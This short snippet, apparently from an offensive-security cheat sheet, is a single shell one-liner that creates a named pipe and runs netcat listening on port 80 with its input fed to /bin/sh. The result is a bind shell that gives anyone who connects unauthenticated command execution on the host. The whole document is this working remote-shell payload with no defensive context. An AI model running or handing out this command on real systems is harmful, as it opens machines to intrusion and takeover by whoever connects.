# setup a listener using named pipes
mkfifo /tmp/f; nc -lvnp 80 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f